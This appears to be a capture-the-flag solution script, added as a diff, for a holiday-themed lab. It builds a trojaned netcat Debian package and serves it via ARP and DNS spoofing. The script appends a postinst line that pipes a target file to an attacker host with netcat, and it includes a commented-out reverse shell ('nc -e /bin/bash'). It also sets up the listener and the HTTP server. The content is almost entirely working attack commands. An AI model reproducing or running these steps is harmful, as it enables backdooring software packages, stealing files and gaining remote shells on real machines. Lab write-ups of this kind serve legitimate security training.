@@ -1,0 +1,44 @@
+# nano arpjy.py  paste in code
+# nano dnsjy.py  paste in code
+
+# start netcat listener
+# RCE
+#nc -lv -p 41552
+# or download the file
+nc -lv -p 41552 > NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
+
+#switch terminals with cntrl-b o
+
+# build the file
+mkdir packing
+cp debs/netcat-traditional_1.10-41.1ubuntu1_amd64.deb packing/
+cd packing
+dpkg -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb work
+mkdir work/DEBIAN
+ar -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb
+tar xvf control.tar.xz
+mv control work/DEBIAN/
+mv postinst work/DEBIAN/
+# RCE
+#echo 'nc -e /bin/bash 10.6.0.4 41552 2>/dev/null &' >> work/DEBIAN/postinst
+# or download the file
+echo 'cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt | nc  10.6.0.4 41552 2>/dev/null &' >> work/DEBIAN/postinst
+dpkg-deb --build /home/guest/packing/work/
+mv work.deb suriv_amd64.deb
+cd ~
+mkdir pub
+mkdir pub/jfrost
+mkdir pub/jfrost/backdoor
+mv packing/suriv_amd64.deb pub/jfrost/backdoor/
+
+# start the server
+python3 -m http.server 80
+
+#switch terminals with cntrl-b o
+
+# start and background dnsjy.py, then start arpjy.py
+python3 dnsjy.py &
+python3 arpjy.py
+
+# if using RCE, switch to the nc terminal and download the file we want
+cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
